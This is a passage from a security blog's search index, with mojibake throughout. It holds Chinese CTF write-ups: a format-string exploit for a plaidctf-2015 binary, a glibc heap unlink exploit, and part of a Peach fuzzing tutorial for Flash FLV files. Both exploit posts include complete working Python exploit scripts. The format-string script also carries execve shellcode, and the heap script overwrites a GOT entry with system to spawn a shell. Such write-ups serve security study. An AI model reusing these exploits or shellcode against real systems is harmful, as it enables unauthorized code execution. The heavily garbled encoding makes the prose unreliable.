¼å¼åŒ–å­—ç¬¦ä¸²æ¥è¯´ï¼Œæœ¬è´¨è¿˜æ˜¯ä»»æ„åœ°å€çš„è¯»å†™ï¼Œå¯ä»¥ç”¨æ¥ä¿®æ”¹gotã€ret_addrå»æ§åˆ¶ç¨‹åºæµç¨‹ï¼Œè¿˜å¯ä»¥ å¤šæ¬¡åˆ©ç”¨æ ¼å¼ä¸²ï¼ŒæŠŠshellcodeä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚å†™åˆ°ä¸€ä¸ªw+xçš„å†…å­˜åœ°å€å»ï¼Œç„¶åä¿®æ”¹gotè·³è¿‡å»æ‰§è¡Œã€‚ ä½†æ˜¯å¦‚æœæ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸åœ¨æ ˆä¸­å‘¢ï¼Ÿå¦‚æœä¸åœ¨æ ˆä¸­ï¼Œé‚£ä¹ˆå°±ä¸èƒ½é€šè¿‡ %*$ è¿™æ ·çš„æ–¹å¼å»å®šä½ï¼Œå¢å¤§äº†åˆ©ç”¨éš¾åº¦ï¼Œåœ¨çœ‹äº†phrackçš„æ–‡ç« ï¼Œäº†è§£åˆ°äº†ä¸€ç§å§¿åŠ¿ï¼šå‡å¦‚è¦æŠŠ sleep@gotä¿®æ”¹æˆ system@gotï¼Œå¯ä»¥å…ˆåˆ©ç”¨æ ¼ å¼ä¸²æŠŠsleep@gotå…ˆå†™åˆ°å½“å‰ebpæŒ‡å‘ï¼Œç„¶åå†æ¬¡åˆ©ç”¨ï¼ŒæŠŠè¿™ä¸ªæ”¹æ‰ï¼Œå› ä¸ºéƒ½æ˜¯åœ¨ gotè¡¨ä¸­ï¼Œæ‰€ä»¥åªéœ€è¦æ”¹æœ€åä¸¤ä¸ªå­—èŠ‚(x86)ã€‚ è¿™æ ·çš„è¯å°±å®ç°äº† ä¸åœ¨æ ˆä¸­æ ¼å¼ä¸²çš„åˆ©ç”¨äº†ã€‚ 0x02ï¼šå®ä¾‹æ‹¿plaidctf-2015çš„ä¸€ä¸ªpwnæ¥æ¼”ç¤ºã€‚ binæ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯å¦‚å›¾ï¼Œåˆ†åˆ«è¿è¡Œå’Œåœ¨idaä¸­åˆ†æã€‚æ˜æ˜¾çš„FSBåœ¨ make_response å‡½æ•°ä¸­ã€‚ ä½†æ˜¯ï¼Œç”¨æˆ·çš„è¾“å…¥æ˜¯åœ¨ 0804A040 è¿™ä¸ªåœ°å€ï¼Œè¿™ä¸ªåœ°å€æ˜¯åœ¨.bssæ®µçš„(æ ˆä¸­çœ‹ä¸åˆ°ï¼Œä½†æ˜¯å¥½å¤„æ˜¯ä¸éšæœº) æ€è·¯å¤§æ¦‚å°±æ˜¯ï¼ŒæŠŠshellcodeæ”¾åœ¨è¿™ä¸ªåœ°æ–¹ï¼Œç„¶åä¿®æ”¹ make_response çš„ret addr åˆ°è¿™ä¸ªåœ°å€å»ï¼Œç„¶åå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚ 1. leak æ ˆåœ°å€ æ‰¾åˆ°ret addr 2. å†™åˆ°ä¸Šä¸€ä¸ªebpå» 3. ä¿®æ”¹ret addr åˆ° 0804A040 0x03:exp1234567891011121314151617181920212223242526#!/usr/bin/python#--by muhe--from zio import *#target='./ebp'target = ('127.0.0.1',10001)io = zio(target, timeout=10000, print_read=COLORED(RAW, 'red'), print_write=COLORED(RAW, 'green'))shellcode = (\"\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\" \"\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x54\" \"\\x5b\\x52\\x53\\x54\\x59\\x0f\\x34\")vuln_addr =0x0804a480#leak stack addrio.writeline('%4$p')#raw_input()leak_addr = int(io.read_until('\\n'),16)ret_addr = (leak_addr-0x1c) &amp; 0xffffprint ret_addr#overwrite#raw_input()p1 = \"%\"+str(ret_addr)+\"x%\"+str(4)+\"$hn\"io.writeline(p1)io.read_until('\\n')#get shell##raw_input()p2 = shellcode+\"%\"+str((vuln_addr &amp; 0xffff)-len(shellcode))+\"x%\"+str(12)+\"$hn\"io.writeline(p2)io.interact() 0x04:å‚è€ƒ phrack geeksspeak","link":"/2015/12/02/format-string-with-stack-frame/"},{"title":"heap vuln -- unlink","text":"0x00:èµ·å› ä¸€ç›´åœ¨å †çš„æ¼æ´åˆ©ç”¨ä¸­ä¸å¾—è¦é¢†ï¼Œä¹‹å‰ZCTFåˆæ˜¯ä¸‰ä¸ªå †çš„åˆ©ç”¨ï¼Œè¡€å´©ï¼Œchxxè¡¨å“¥ç»™å†™äº†ä¸€ä¸ªheapçš„pwnï¼Œå­¦ä¹ å­¦ä¹ ã€‚ 0x01:å…³äºheapçš„unlinkçš„æ¼æ´åˆ©ç”¨ï¼Œå‡ºçš„å¾ˆæ—©ï¼Œåœ¨ä½ç‰ˆæœ¬çš„libcä¸­ï¼Œå› ä¸ºæ²¡æœ‰æ ¡éªŒï¼Œå¯¼è‡´åœ¨unlinkçš„æ—¶å€™å¯ä»¥é€šè¿‡æ„é€ å †å—dwordshootï¼Œä»è€Œä»»æ„ä»£ç æ‰§è¡Œã€‚å¯¹äºè¿™ç§æ¼æ´çš„å­¦ä¹ ï¼Œé¦–å…ˆè¦äº†è§£mallocçš„å·¥ä½œåŸç†åŠå‡ ç§å †å—çš„åˆ†é…ã€ä½¿ç”¨æ–¹å¼ã€‚æ¨èæ–‡ç«  Understanding glibc malloc 0x02:æ–‡ä»¶ä¿¡æ¯ 0x03:åˆ†æç¨‹åºæ˜¯ä¸€ä¸ªèœå•å¼çš„ç¨‹åºï¼Œå¯ä»¥ç”¨æˆ·è‡ªå®šä¹‰åˆ†é…å—çš„é•¿åº¦å’Œå†…å®¹ï¼Œæ¼æ´åœ¨äºï¼šeditçš„æ—¶å€™ï¼Œæ²¡åšé•¿åº¦æ ¡éªŒå¯¼è‡´å¯ä»¥æº¢å‡ºï¼Œé€šè¿‡æ„é€ å¯ä»¥bypass åœ¨libcä¸­unlinkçš„æ ¡éªŒï¼Œä»è€Œgetshellã€‚ 0x04:åœ¨dropsçœ‹åˆ°çš„å§¿åŠ¿å †æº¢å‡ºçš„unlinkåˆ©ç”¨æ–¹æ³•æŒ‰ç…§æ–‡ä¸­ç»™å‡ºçš„æ–¹å¼ï¼Œä¸ºäº†bypass 12if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))4malloc_printerr (check_action, \"corrupted double-linked list\", P); è¿™ä¹ˆä¸€ä¸ªæŒ‡é’ˆçš„æ ¡éªŒï¼Œæˆ‘ä»¬æ‰¾åˆ°ä¸€ä¸ªç‰¹æ®Šçš„ æŒ‡é’ˆptræ˜¯æŒ‡å‘pçš„(pæŒ‡å‘å †)é‚£ä¹ˆå¯ä»¥æ ¹æ®på»æ„é€ bkå’Œfdä¸¤ä¸ªæŒ‡é’ˆ 1234567891011chunk0 mallocè¿”å›çš„ptr chunk1 mallocè¿”å›çš„ptr| | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+| | |fake|fake|fake|fake| D | fake | fake | | | || | |prev|size| FD | BK | A | prev | size&amp;| | | || prev_size |size&amp;Flag|size| | | | T | size | flag | | | || | | | | | | A | | | | | || | | | | | | | | | | | |+-----------+---------+----+----+----+----+----+------+------+----+----+------+ |--------new_size--------| list 123456l32(0) + l32(0x89) + l32(list-0xc) + l32(list-0x8) +\"A\"*(128-4*4)#fake_pre_szie + fake_size + fake_FD + fake_BK + DATA# 4bytes 4bytes 4bytes 4bytes 128-4*4#pre_size + size&amp;flagl32(0x80) + l32(0x88)free(chunk_1) åˆ†é…ä¸¤ä¸ªé•¿åº¦åˆé€‚çš„å—ï¼Œä¼ªé€ ç¬¬ä¸€ä¸ªå—ï¼Œç„¶åé€šè¿‡ä¿®æ”¹äº†ç¬¬äºŒä¸ªå—çš„pre_size å’Œsizeç„¶åfree(chunk1) è§¦å‘unlink ä¹‹åå†æ¬¡ä¿®æ”¹æŒ‡é’ˆp ä»è€Œè¾¾åˆ°leakåœ°å€ï¼Œä¿®æ”¹åœ°å€çš„ç›®çš„ 0x05:exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677from pwn import *context.update(os='linux', arch='i386')p = remote('127.0.0.1',10001)chunk_list = 0x8049d60free_got = 0x8049ce8flag = 0def leak(addr): data = \"A\" * 0xc + p32(chunk_list-0xc) + p32(addr) global flag if flag == 0: set_chunk(0, data) flag = 1 else: set_chunk2(0, data) res = \"\" p.recvuntil('5.Exit\\n') res = print_chunk(1) print(\"leaking: %#x ---&gt; %s\" % (addr, res[0:4].encode('hex'))) return res[0:4]def add_chunk(len):4print p.recvuntil('\\n')4p.sendline('1')4print p.recvuntil('Input the size of chunk you want to add:')4p.sendline(str(len))def set_chunk(index,data):4p.recvuntil('5.Exit\\n')4p.sendline('2')4p.recvuntil('Set chunk index:')4p.sendline(str(index))4p.recvuntil('Set chunk data:')4p.sendline(data)def set_chunk2(index, data): p.sendline('2') p.recvuntil('Set chunk index:') p.sendline(str(index)) p.recvuntil('Set chunk data:') p.sendline(data)def del_chunk(index):4p.recvuntil('\\n')4p.sendline('3')4p.recvuntil('Delete chunk index:')4p.sendline(str(index))def print_chunk(index):4p.sendline('4')4p.recvuntil('Print chunk index:')4p.sendline(str(index))4res = p.recvuntil('5.Exit\\n')4return resraw_input('add_chunk')add_chunk(128) #0add_chunk(128) #1add_chunk(128) #2add_chunk(128) #3set_chunk(3, '/bin/sh')#fake_chunkpayload = \"\"payload += p32(0) + p32(0x89) + p32(chunk_list-0xc) + p32(chunk_list-0x8)payload += \"A\"*(0x80-4*4)#2nd chunk payload += p32(0x80) + p32(0x88)set_chunk(0,payload)#get the pointerdel_chunk(1)set_chunk(0, 'A' * 12 + p32(0x8049d54) + p32(0x8049d14))raw_input('leak')#leak system_addrpwn_elf = ELF('./heap')d = DynELF(leak, elf=pwn_elf)sys_addr = d.lookup('system', 'libc')print(\"system addr: %#x\" % sys_addr)raw_input('edit free@got')data = \"A\" * 12 + p32(chunk_list-0xc) + p32(free_got)set_chunk2('0', data)set_chunk2('1', p32(sys_addr))del_chunk('3')p.interactive()p.close() 0x06:å‚è€ƒ Understanding glibc malloc å †æº¢å‡ºçš„unlinkåˆ©ç”¨æ–¹æ³• æœ€åè¿˜è¦æ„Ÿè°¢chxxå¤§è¡¨å“¥çš„pwnå’ŒæŒ‡å¯¼=ã€‚= æ‰€æœ‰æ–‡ä»¶éƒ½åœ¨è¿™é‡Œäº† æ–‡ä»¶ä¸‹è½½","link":"/2016/02/15/heap-vuln-unlink/"},{"title":"fuzzing with peach(Just a toy)","text":"0x00: å‰è¨€ä¹‹å‰å­¦ä¹ è¿‡peachçš„ä½¿ç”¨ï¼Œåœ¨willjå¸ˆå‚…çš„æŒ‡å¯¼ä¸‹å°è¯•å»fuzzäº†æŸæ’­æ”¾å™¨ï¼Œåªæ˜¯ä¸ªå°è¯•ï¼Œå¹¶æ²¡æœ‰æ›´æ·±å…¥å»æ(æœ¬æ¥çš„è®¡åˆ’æ˜¯ç»“åˆwinaflçš„)ï¼Œè™½ç„¶æ²¡å•¥äº§å‡ºï¼Œä½†æ˜¯fuzzè¿‡ç¨‹è¿˜ç®—æ¸…æ™°ã€‚è¿‡ç¨‹ä¸­å®ç°äº†è‡ªåŠ¨åŒ–çš„fuzzè„šæœ¬ï¼Œæœ‰å®Œæ•´çš„åŠŸèƒ½ï¼Œå°±æ˜¯æ•ˆç‡å ªå¿§-ã€‚- 0x01: å…³äºpeachpeachæ˜¯ä¸€æ¬¾ä¼˜ç§€çš„æ–‡ä»¶æ ¼å¼fuzzå·¥å…·ã€‚peachæ˜¯åŸºäºæ¨¡æ¿å˜å¼‚å·¥ä½œçš„ï¼Œè€Œä¸”å¼€æºï¼Œæ–‡æ¡£è™½ç„¶ä¸æ˜¯é‚£ä¹ˆå¤šï¼Œä½†æ˜¯è‡ªå·±å¤šæ‘¸ç´¢ã€å­¦ä¹ è¿˜æ˜¯å¯ä»¥å­¦ä¼šä¸€äº›åŸºæœ¬çš„ç”¨æ³•çš„ã€‚æˆ‘åœ¨çœ‹ä½¿ç”¨peachåšæ–‡ä»¶fuzzç›¸å…³çš„èµ„æ–™çš„æ—¶å€™ï¼Œæœ€å¼€å§‹çœ‹çš„ã€Š0day2ã€‹é‡Œä½œè€…ç»™çš„ä¾‹å­ï¼Œä»ç¼–å†™pit fileåˆ°fuzzè·‘èµ·æ¥ï¼›ä¹‹åçœ‹äº†ä¸€ä»½å›½é™…å‹äººå†™çš„Fuzzing with Peach â€“ Part 1 Â« Flinkd!ï¼Œä»–è¿™ç¯‡æ–‡ç« å†™çš„éå¸¸å¥½ï¼Œå‡ ä¹æ¶µç›–äº†peach 90%çš„è¯­æ³•ï¼Œä»”ç»†é˜…è¯»ï¼Œè‡ªå·±åŠ¨æ‰‹å®è·µï¼Œä¼šå¾ˆå¿«å…¥é—¨pit fileçš„ç¼–å†™ã€‚ 0x02: æ–‡ä»¶fuzzçš„æ€è·¯fuzzå˜›ï¼Œç®€å•çš„æ¥çœ‹å°±æ˜¯ æ„é€ è¾“å…¥ ä¼ ç»™ç›®æ ‡ç¨‹åº ç¨‹åºçŠ¶æ€æ£€æµ‹(æ˜¯å¦crash) åšlog ä¹‹åæ ¹æ®ä½ çš„logï¼ŒæŠŠæœ‰ç”¨çš„æ ·æœ¬æ‹¿å‡ºæ¥åœ¨åˆ†æã€‚æˆ‘çš„æƒ³æ³•ä¹Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯åˆ©ç”¨peachåŸºäºæˆ‘ç»™çš„ä¸€ä¸ªå°æ–‡ä»¶ï¼Œç”Ÿæˆå¾ˆå¤šæ ·æœ¬ï¼Œç„¶åå†™è‡ªåŠ¨åŒ–çš„è„šæœ¬å»fuzzï¼Œå¹¶ä¸”åšå¥½å¼‚å¸¸æ£€æµ‹çš„å·¥ä½œã€‚æˆ‘çš„ç›®æ ‡æ˜¯adobe flash player saç‰ˆæœ¬ï¼Œåˆšå¼€å§‹å°è¯•å°±åšä¸€ç‚¹ç®€å•çš„ï¼Œé€‰æ‹©flvæ–‡ä»¶ä½œä¸ºfuzzçš„ç‚¹ã€‚ä¸‹é¢çš„é—®é¢˜å°±æ˜¯ï¼š flvæ–‡ä»¶æ ¼å¼ æ ¹æ®æ–‡ä»¶æ ¼å¼ç¼–å†™pit file å¦‚ä½•åŠ è½½æˆ‘çš„fuzz.flvæ–‡ä»¶ï¼Ÿ å¼‚å¸¸æ£€æµ‹æ€ä¹ˆåš ä¸‹é¢æ…¢æ…¢æ¥åˆ†æã€‚ flvæ–‡ä»¶æ ¼å¼flvæ–‡ä»¶ä¸»è¦åˆ†ä¸ºheaderå’Œbodyä¸¤ä¸ªéƒ¨åˆ†ã€‚ headeréƒ¨åˆ†1234ç¬¬1-3å­—èŠ‚ï¼šæ–‡ä»¶æ ‡å¿—ï¼ŒFLVçš„æ–‡ä»¶æ ‡å¿—ä¸ºå›ºå®šçš„â€œFLV&quot;ï¼Œå­—èŠ‚ï¼ˆ0x46ï¼Œ 0x4Cï¼Œ0x56ï¼‰ï¼Œè§ä¸Šé¢çš„å­—èŠ‚åºå’Œå­—ç¬¦åºä¸¤è¡Œï¼›ç¬¬4å­—èŠ‚ï¼šå½“å‰æ–‡ä»¶ç‰ˆæœ¬ï¼Œå›ºå®šä¸º1ï¼ˆ0x01ï¼‰ç¬¬5å­—èŠ‚ï¼šæ­¤å­—èŠ‚å½“å‰ç”¨åˆ°çš„åªæœ‰ç¬¬6ï¼Œ8ä¸¤ä¸ªbitä½ï¼Œåˆ†åˆ«æ ‡å¿—å½“å‰æ–‡ä»¶æ˜¯å¦å­˜åœ¨éŸ³é¢‘ï¼Œè§†é¢‘ã€‚å‚è§ä¸Šé¢bitåºï¼Œå³æ˜¯ç¬¬5å­—èŠ‚çš„å†…å®¹ï¼›ç¬¬6-9å­—èŠ‚ï¼šæ­¤4å­—èŠ‚å…±åŒç»„æˆä¸€ä¸ªæ— ç¬¦å·32ä½æ•´æ•°ï¼ˆä½¿ç”¨å¤§å¤´åºï¼‰ï¼Œè¡¨ç¤ºæ–‡ä»¶ä»FLV Headerå¼€å§‹åˆ°Flv Bodyçš„å­—èŠ‚æ•°ï¼Œå½“å‰ç‰ˆæœ¬å›ºå®šä¸º9ï¼ˆ0x00ï¼Œ0x00ï¼Œ0x00ï¼Œ0x09ï¼‰ bodyéƒ¨åˆ†è¿™éƒ¨åˆ†å…¶å®å°±æ˜¯å¾ˆå¤šçš„tagçš„ç»„åˆã€‚ä¸è¿‡tagçš„ç§ç±»æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯scriptã€Audioã€Videoã€‚æ¯ç§tagçš„tag dataåˆå„ä¸ç›¸åŒï¼Œè¯¦ç»†çš„å¯ä»¥çœ‹ä¸€äº›æ–‡æ¡£äº†è§£ã€‚ 123456789101112131415-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |-------------------------| Tag |-------------------------| Previous Tag Size |------------------------- ä¸€äº›å‚è€ƒçš„æ–‡æ¡£flvæ–‡ä»¶æ ¼å¼è¯¦è§£ï¼Œä»¥åŠæ˜¯å®˜æ–¹çš„flvæ ¼å¼ç›¸å…³çš„æ–‡æ¡£éƒ½å¯ä»¥ã€‚ æ ¹æ®æ–‡ä»¶æ ¼å¼ç¼–å†™pit fileäº†è§£äº†æ–‡ä»¶æ ¼å¼ä¹‹åå°±æ˜¯ç¼–å†™pit fileäº†ï¼Œå›°éš¾çš„åœ°æ–¹å¯èƒ½å°±åœ¨äºtagç»“æ„ï¼Œå› ä¸ºæ•°ç›®ä¸ç¡®å®šï¼Œè€Œä¸”ç›¸äº’ä¹‹é—´æœ‰è”ç³»ï¼Œæ¯”å¦‚æŸä¸ªbitä¸º1æˆ–è€…0ï¼Œå½±å“ç€åé¢çš„æŸä¸ªç»“æ„çš„æœ‰æ— ã€‚æˆ‘çš„åšæ³•æ˜¯ï¼Œæˆ‘ä½¿ç”¨ç±»ä¼¼Switch caseè¿™æ ·çš„ç»“æ„ï¼Œè®©peachè‡ªå·±å»åˆ¤æ–­é€‰æ‹©å¯¹åº”çš„ç»“æ„ï¼Œå³æˆ‘å†™ä¸‰ç§tagï¼Œç„¶åé™å®šæœ€å¤§çš„å‡ºç°æ¬¡æ•°ï¼Œå› ä¸ºæ ·æœ¬å¾ˆå°ï¼Œå‡ ç™¾ä¸ªæœ€å¤šäº†ï¼Œç„¶åpeachæ ¹æ®æ¨¡æ¿æ–‡ä»¶çš„tagçš„æ ‡å¿—ï¼Œæ‰¾åˆ°æˆ‘pit fileé‡Œå¯¹åº”çš„tagçš„ç»“æ„ï¼Œç„¶åæ ¹æ®pit fileé‡Œçš„ç»“æ„è¿›è¡Œå˜å¼‚ï¼Œç„¶åç”Ÿæˆæ–°çš„æ ·æœ¬ã€‚è¿™é‡Œå¯ä»¥é›†åˆ010 editorçš„äºŒè¿›åˆ¶æ¨¡æ¿åŠŸèƒ½ï¼Œå¯ä»¥å¯¹æ¯”ä½ ç”Ÿæˆçš„æ ·æœ¬æ˜¯å¦æ­£ç¡®ï¼Œæ–¹ä¾¿è°ƒè¯•ã€‚ å¦‚ä½•åŠ è½½æˆ‘çš„fuzz.flvæ–‡ä»¶ï¼Ÿæœ‰äº†æ ·æœ¬ï¼Œä¸‹é¢çš„é—®é¢˜å°±æ˜¯æ€ä¹ˆåŠ è½½æ ·æœ¬ç„¶åæ’­æ”¾äº†ã€‚flashå¹¶ä¸ç›´æ¥æ‰“å¼€flvæ–‡ä»¶ï¼Œè€Œæ˜¯ä½¿ç”¨swfæ¥åŠ è½½ï¼Œæ‰€ä»¥æˆ‘éœ€è¦ç”¨asè¯­è¨€æ¥ç¼–å†™ä¸€ä¸ªswfæ¥åŠ è½½ã€‚è¿™æ—¶å€™å°±æœ‰åˆä¸€ä¸ªé—®é¢˜ï¼šswfè¦ç¼–è¯‘çš„ï¼Œå³æˆ‘çš„æ–‡ä»¶åä¼šå†™æ­»ï¼Œè¿™æ—¶å€™å°±éº»çƒ¦äº†ã€‚ä¸è¿‡è¿™ä¸ªä¹Ÿå¥½è§£å†³ï¼Œæˆ‘å¯ä»¥åœ¨åç»­çš„fuzzè„šæœ¬ä¸­ï¼Œæ¯æ¬¡å•ç‹¬å¤åˆ¶ä¸€ä¸ªæ ·æœ¬åˆ°å·¥ä½œç›®å½•ï¼Œç„¶åé‡å‘½åä¸ºswfè¦åŠ è½½çš„æ–‡ä»¶çš„åå­—ï¼Œç„¶åèµ·flashï¼ŒåŠ è½½swfï¼Œç„¶ååšåç»­çš„å·¥ä½œï¼›å®Œæˆä¹‹åï¼Œå¾ªç¯è¿™ä¸ªå·¥ä½œã€‚è¿™æ ·å°±å¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜äº†ã€‚ å¼‚å¸¸æ£€æµ‹æ€ä¹ˆåšæˆ‘è§‰å¾—æœ€ç®€å•çš„åŠæ³•å°±æ˜¯è°ƒè¯•å™¨äº†ï¼Œå¦‚æœä½ è¿›ç¨‹å´©äº†ï¼Œä½ çš„just in time debuggerä¼šå¯åŠ¨ï¼Œé—®ä½ è¦ä¸è¦è°ƒè¯•ï¼Œä½ æ£€æµ‹è¿›ç¨‹å°±å¯ä»¥äº†ï¼Œç„¶ååšlogï¼Œæ€äº†æ‰€æœ‰è¿›ç¨‹ï¼Œç»§ç»­ä¸‹ä¸€è½®fuzzå°±å¥½äº†ã€‚ç¼ºç‚¹å¾ˆæ˜æ˜¾ï¼Œè¿™æ–¹æ³•è´¼æ“ï¼Œè€Œä¸”æ•ˆç‡ä½çš„è¦æ­»ï¼Œåˆšå¼€å§‹æå˜›ï¼Œå‡‘åˆç”¨å’¯ã€‚ 0x03: ç¼–å†™pit fileé¦–å…ˆæ˜¯é’ˆå¯¹flv headerçš„éƒ¨åˆ†çš„ç¼–å†™ 1234567891011&lt;DataModel name=&quot;flvHeader&quot;&gt; &lt;String name=&quot;flv_Signature&quot; value=&quot;464C5601&quot; valueType=&quot;hex&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Flags name=&quot;HeadFlags&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;dummy&quot; position=&quot;3&quot; size=&quot;5&quot;/&gt; &lt;Flag name=&quot;audio&quot; position=&quot;2&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;dummy2&quot; position=&quot;1&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;video&quot; position=&quot;0&quot; size=&quot;1&quot;/&gt; &lt;/Flags&gt; &lt;Number name=&quot;dataoffset&quot; value=&quot;9&quot; size=&quot;32&quot;/&gt; &lt;Number name=&quot;zero&quot; size=&quot;32&quot;/&gt;&lt;/DataModel&gt; è¿™éƒ¨åˆ†æ˜¯script tagéƒ¨åˆ†çš„ç¼–å†™ 12345678910&lt;Block name=&quot;script&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;18&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;firstbyte&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Blob name=&quot;data2&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize').getInternalValue())-1&quot;/&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; è¿™éƒ¨åˆ†æ˜¯audio tagéƒ¨åˆ†çš„ç¼–å†™ 1234567891011121314151617181920212223&lt;Block name=&quot;audio&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;8&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize1&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Flags name=&quot;Flag3&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;fmt&quot; position=&quot;0&quot; size=&quot;4&quot;/&gt; &lt;Flag name=&quot;sr&quot; position=&quot;4&quot; size=&quot;2&quot;/&gt; &lt;Flag name=&quot;bits&quot; position=&quot;6&quot; size=&quot;1&quot;/&gt; &lt;Flag name=&quot;channels&quot; position=&quot;7&quot; size=&quot;1&quot;/&gt; &lt;/Flags&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag3.fmt').getInternalValue()) == 10&quot;/&gt; &lt;Blob name=&quot;frmtype&quot; length=&quot;1&quot;/&gt; &lt;Blob name=&quot;data1&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize1').getInternalValue())-2&quot;/&gt; &lt;/Block&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag3.fmt').getInternalValue()) != 10&quot;/&gt; &lt;Blob name=&quot;data1&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize1').getInternalValue())-1&quot;/&gt; &lt;/Block&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; è¿™éƒ¨åˆ†æ˜¯video tagçš„éƒ¨åˆ†çš„ç¼–å†™ 12345678910111213141516171819202122&lt;Block name=&quot;video&quot;&gt; &lt;Number name=&quot;type&quot; size=&quot;8&quot; signed=&quot;false&quot; endian=&quot;big&quot; value=&quot;9&quot; token=&quot;true&quot; mutable=&quot;false&quot;/&gt; &lt;Number name=&quot;datasize2&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestamp&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;timestampi&quot; size=&quot;8&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Number name=&quot;streamid&quot; size=&quot;24&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt; &lt;Flags name=&quot;Flag2&quot; size=&quot;8&quot;&gt; &lt;Flag name=&quot;frmtype&quot; position=&quot;0&quot; size=&quot;4&quot;/&gt; &lt;Flag name=&quot;codecid&quot; position=&quot;4&quot; size=&quot;4&quot;/&gt; &lt;/Flags&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag2.codecid').getInternalValue()) == 7&quot;/&gt; &lt;Blob name=&quot;pkttype&quot; length=&quot;1&quot;/&gt; &lt;Blob name=&quot;compotime&quot; length=&quot;3&quot;/&gt; &lt;Blob name=&quot;data&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize2').getInternalValue())-5&quot;/&gt; &lt;/Block&gt; &lt;Block&gt; &lt;Relation type=&quot;when&quot; when=&quot;int(self.find('Flag2.codecid').getInternalValue()) != 7&quot;/&gt; &lt;Blob name=&quot;data&quot; lengthType=&quot;calc&quot; length=&quot;int(self.find('datasize2').getInternalValue())-1&quot;/&gt; &lt;/Block&gt; &lt;Number name=&quot;lastsize&quot; size=&quot;32&quot; endian=&quot;big&quot; signed=&quot;false&quot;/&gt;&lt;/Block&gt; 0x04: swfåŠ è½½æ ·æœ¬åˆ©ç”¨asè¯­è¨€ç¼–å†™çš„ä»£ç ï¼Œç¼–è¯‘åå¾—åˆ°swfæ–‡ä»¶ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package{ import flash.display.Sprite; import flash.net.*; import flash.media.*; import flash.utils.*; import flash.display.* import flash.events.*; import flash.system.fscommand; import flash.display3D.textures.VideoTexture; public class Main extends Sprite { public function Main():void { var video:Video; var netCon:NetConnection; var stream:NetStream; function loadVideo(url:String):Video { video = new Video(); netCon = new NetConnection(); netCon.connect(null); stream = new NetStream(netCon); stream.play(url); var client:Object = new Object(); client.onMetaData = onMetaEvent; stream.client = client; stream.addEventListener(NetStatusEvent.NET_STATUS, netStatus); video.attachNetStream(stream); return video; } function onMetaEvent(e:Object):void { } function netStatus(e:NetStatusEvent):void { video.width = stage.stageWidth; video.height = stage.stageHeight; } stage.addChild(loadVideo(&quot;fuzz.flv&quot;)); } }} 0x05: è‡ªåŠ¨åŒ–fuzzè„šæœ¬æ ¸å¿ƒéƒ¨åˆ†çš„ä»£ç å¦‚ä¸‹ã€‚ 1234567def run(fileID): copyFile(fileID) subprocess.Popen(runCmd) #sleep(2) checkCrash() #sleep(1) clean() é¦–å…ˆä¼šæ‹·è´ä¸€ä¸ªæ ·æœ¬æ–‡ä»¶åˆ°å·¥ä½œç›®å½• 12def copyFile(fileID): shutil.copyfile(fileDict.get(fileID),workDir+&quot;fuzz.flv&quot;) 